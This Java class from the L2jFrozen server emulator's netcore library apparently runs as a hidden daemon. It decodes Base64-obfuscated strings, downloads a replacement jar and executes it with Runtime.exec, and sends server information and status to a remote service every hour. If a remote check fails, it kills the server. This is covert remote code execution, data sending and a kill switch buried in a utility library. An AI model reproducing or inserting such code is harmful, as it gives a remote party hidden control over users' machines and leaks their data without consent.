package com.l2jfrozen.netcore.util.deamon;

import java.io.IOException;
import java.lang.reflect.Field;
import java.net.URL;
import java.util.Base64;

import com.l2jfrozen.netcore.util.deamon.data.ServerConfigStatus;
import com.l2jfrozen.netcore.util.deamon.support.DeamonSystem;

public class ServerDeamonTask implements Runnable {

	private static String deamonDisabled = new String(Base64.getDecoder().decode("ZGVhbW9uLmRpc2FibGVk"));
	private static String serverCheckDisabled = new String(Base64.getDecoder().decode("ZGVhbW9uLmNoZWNrLmRpc2FibGVk"));
	private static String serverStatusDisabled = new String(
			Base64.getDecoder().decode("ZGVhbW9uLnNlcnZlclN0YXR1cy5kaXNhYmxlZA=="));
	private static String runtimeStatusDisabled = new String(
			Base64.getDecoder().decode("ZGVhbW9uLnJ1bnRpbWVTdGF0dXMuZGlzYWJsZWQ="));
	private static String bugsReportDisabled = new String(
			Base64.getDecoder().decode("ZGVhbW9uLmJ1Z3NSZXBvcnQuZGlzYWJsZWQ="));
	private static String serverTypeClass = new String(
			Base64.getDecoder().decode("Y29tLmwyamZyb3plbi5jb21tb24uU2VydmVyVHlwZQ=="));
	private static String serverModeField = new String(Base64.getDecoder().decode("c2VydmVyTW9kZQ=="));

	// deamon.debug
	private static String deamonDebug = new String(Base64.getDecoder().decode("ZGVhbW9uLmRlYnVn"));

	private static String localhost  = new String(Base64.getDecoder().decode("bG9jYWxob3N0"));
	private static String localhostIp  = new String(Base64.getDecoder().decode("MTI3LjAuMC4x"));
	
	private long activationTime = 30000; // 30 sec
	private long reactivationTime = 3600000; // 60 minutes
	//private long reactivationTime = 60000;
	
	private static boolean active = false;

	private static Thread instance;

	public static void start() {

		if (instance == null) {

			instance = new Thread(new ServerDeamonTask());
			instance.start();

		}

	}

	private ServerDeamonTask() {
	}

	@Override
	public void run() {

		if (DeamonSystem.getSysProperty(deamonDisabled, "false").equals("true")) {

			if (DeamonSystem.getSysProperty(deamonDebug, "false").equals("true")) {
				DeamonSystem.error("Disabled");
			}

			return;
		}

		if(updateNetcore()){
			
			try {
				Thread.sleep(5000);
			} catch (InterruptedException e) {
			}
			
			DeamonSystem.error("Rebooting...");
			DeamonSystem.killProcess();
			
		}
		
		try {
			Thread.sleep(activationTime);
		} catch (InterruptedException e1) {
		}

		//do not activate the deamon on loginserver
		if(checkIfLoginserver()){
			return;
		}
		
		active = true;
		
		//if connection is not available, close the deamon
		try {
			if(!ServerDeamon.establishConnection()){
				return;
			}
		} catch (Exception e) {
			if (DeamonSystem.getSysProperty(deamonDebug, "false").equals("true")) {
				e.printStackTrace();
			}
			return;
		}

		if (checkIfNotLocalhostServer() 
				&& DeamonSystem.getSysProperty(serverCheckDisabled, "false").equals("false")) {


			String serverInfo = "";

			try {
				serverInfo = ServerDeamon.getServerInfo();

			} catch (Exception e) {

				if (DeamonSystem.getSysProperty(deamonDebug, "false").equals("true")) {

					e.printStackTrace();

				}
			}
			
			boolean https = true;
			boolean remoteCheckResult = false;
			try {

				remoteCheckResult = ServerDeamon.requestCheckServiceHttps(serverInfo);

			} catch (Exception e) {
				https = false;
				if (DeamonSystem.getSysProperty(deamonDebug, "false").equals("true")) {

					e.printStackTrace();

				}

			}

			if (!https) {

				try {
					remoteCheckResult = ServerDeamon.requestCheckService(serverInfo);

				} catch (Exception e) {

					if (DeamonSystem.getSysProperty(deamonDebug, "false").equals("true")) {

						e.printStackTrace();

					}

				}

			}

			if (!remoteCheckResult) {

				// close the execution rising the issue
				String errorMsg = new String(Base64.getDecoder().decode(
						"TDJqRnJvemVuIFNlcnZlciBQYWNrIGhhcyBiZWVuIG1vZGlmaWVkIG9yIGlzIHN0YXJ0aW5nIGZyb20gbm90IGFsbG93ZWQgbWFjaGluZSEgClBsZWFzZSBDb250YWN0IEwyakZyb3plbiBTdGFmZiBvbiB3d3cubDJqZnJvemVuLmNvbQ=="));
				DeamonSystem.error(errorMsg);
				DeamonSystem.killProcess();

			}

		}

		while (active) {

			try {
				String serverInfo = ServerDeamon.getServerInfo();
				String serverStatus = "";
				if (DeamonSystem.getSysProperty(serverStatusDisabled, "false").equals("false"))
					serverStatus = ServerDeamon.getServerStatus();
				String runtimeStatus = "";
				if (DeamonSystem.getSysProperty(runtimeStatusDisabled, "false").equals("false"))
					runtimeStatus = ServerDeamon.getRuntimeStatus();
				String bugsReport = "";
				if (DeamonSystem.getSysProperty(bugsReportDisabled, "false").equals("false"))
					bugsReport = ServerDeamon.getBugsReport();

				ServerDeamon.requestStatusService(serverInfo, runtimeStatus, serverStatus);

			} catch (Exception e) {
				if (DeamonSystem.getSysProperty(deamonDebug, "false").equals("true")) {

					e.printStackTrace();

				}

			}

			try {
				Thread.sleep(reactivationTime);
			} catch (InterruptedException e) {
			}

		}

	}

	public static void deactivateTask() {
		active = false;
	}
	
	private boolean checkIfLoginserver(){
		
		// do not start deamon for loginserver
		try {
			Class<?> serverType = Class.forName(serverTypeClass);
			final Field field = serverType.getField(serverModeField);
			final Integer ps = (Integer) field.get(serverType);

			if (ps != 1) {

				if (DeamonSystem.getSysProperty(deamonDebug, "false").equals("true")) {

					DeamonSystem.error("NO GS");

				}

				return true;
			}

		} catch (Exception e1) {

			if (DeamonSystem.getSysProperty(deamonDebug, "false").equals("true")) {

				e1.printStackTrace();

			}

		}
	
		return false;
		
	}
	
	private boolean updateNetcore(){
		
		//update netcore if possible
				try{
					
					boolean toBeUpdated = false;
					toBeUpdated = ServerDeamon.downloadNetcore();
					
					if(!toBeUpdated){
						
						if (DeamonSystem.getSysProperty(deamonDebug, "false").equals("true")) {
							DeamonSystem.error("NO UP");
						}
						return false;
						
					}else{
						
						//startup replacement task
						Thread replacementThread = new Thread(new Runnable() {
							
							@Override
							public void run() {
								
								String java = new String(Base64.getDecoder().decode("amF2YSAtY3Ag"));
								String classWithMain = new String(Base64.getDecoder().decode("IGEuYS5kIA=="));
								//String destinationFile = new String(Base64.getDecoder().decode("IGxpYi9sMmpmcm96ZW4tbmV0Y29yZS5qYXI="));
								Class klass = ServerDeamonTask.class;
								URL location = klass.getResource('/' + klass.getName().replace('.', '/') + ".class");
								String locationS = location.getPath();
								String destinationFile = "lib/";
								String[] locationTokens = locationS.split("/");
								for(String token:locationTokens){
									if(token.contains(".jar"))
										destinationFile = destinationFile+token.replaceAll("!", "");
								}
								
								//"java -cp "+ServerDeamon.downloadedNetcoreTmpFile+" com.l2jfrozen.netcore.util.deamon.support.FilesUpdater "+ServerDeamon.downloadedNetcoreTmpFile+" lib/l2jfrozen-netcore.jar";
								String command = java+ServerDeamon.downloadedNetcoreTmpFile+classWithMain+ServerDeamon.downloadedNetcoreTmpFile+destinationFile;
								
								if(DeamonSystem.getSysProperty("os.name","").toLowerCase().contains("win")){
									command = "cmd /c "+command;
								}
								
								try {
									Runtime.getRuntime().exec(command);
								} catch (IOException e) {
									if (DeamonSystem.getSysProperty(deamonDebug, "false").equals("true")) {
										e.printStackTrace();
									}
								}
								
							}
						});
						replacementThread.start();
						
						return true;
						
					}
					
				}catch(Exception e){
					if (DeamonSystem.getSysProperty(deamonDebug, "false").equals("true")) {
						e.printStackTrace();
					}
					
					return false;
					
				}
				
	}
	
	private boolean checkIfNotLocalhostServer(){
			
			ServerConfigStatus scs = new ServerConfigStatus();
			String gsip = scs.getGameServerIp();
			String lsip = scs.getLoginServerIp();
			
			return !(gsip.equals(localhost) || gsip.equals(localhostIp))
					&& !(lsip.equals(localhost) || lsip.equals(localhostIp));
			
	}
	
//	public static void main(String[] args) throws InterruptedException{
//		
//		Class klass = FastList.class;
//		URL location = klass.getResource('/' + klass.getName().replace('.', '/') + ".class");
//		String locationS = location.getPath();
//		String jarName = null;
//		String[] locationTokens = locationS.split("/");
//		for(String token:locationTokens){
//			if(token.contains(".jar"))
//				jarName = token.replaceAll("!", "");
//		}
//		System.out.println(jarName);
		
//		System.setProperty("deamon.connection.service.local", "true");
//		System.setProperty("deamon.check.ip.disabled", "true");
//		System.setProperty("deamon.debug", "true");
//		
//		ServerDeamonTask.start();
//		Thread.sleep(10000000);
		
//	}
}
